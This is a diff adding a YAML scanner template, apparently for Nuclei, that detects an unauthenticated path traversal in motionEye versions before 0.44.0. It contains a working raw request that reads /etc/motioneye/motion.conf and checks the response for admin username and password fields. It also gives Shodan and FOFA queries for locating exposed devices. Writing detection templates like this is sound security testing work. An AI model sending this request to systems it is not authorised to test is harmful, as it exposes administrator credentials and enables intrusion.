@@ -1,0 +1,32 @@
+id: motioneye-path-traversal
+
+info:
+  name: MotionEye < 0.44.0 - Unauthenticated Path Traversal
+  author: 0x_Akoko
+  severity: critical
+  description: |
+   motionEye before version 0.44.0 contains a path traversal vulnerability in the movie playback handler that allows unauthenticated reading of arbitrary files when the normal user password is empty (the default).
+  reference:
+    - https://github.com/motioneye-project/motioneye/security/advisories/GHSA-phv5-334h-mxcw
+  metadata:
+    verified: true
+    max-request: 1
+    vendor: motioneye-project
+    product: motioneye
+    shodan-query: http.favicon.hash:-923693877
+    fofa-query: icon_hash="1898775751"
+  tags: motioneye,path-traversal,auth-bypass,lfi,unauth
+
+http:
+  - raw:
+      - |
+        GET /movie/1/playback//etc/motioneye/motion.conf HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains_all(body, "@admin_password", "@admin_username")'
+          - 'contains(to_lower(header), "tornadoserver")'
+        condition: and
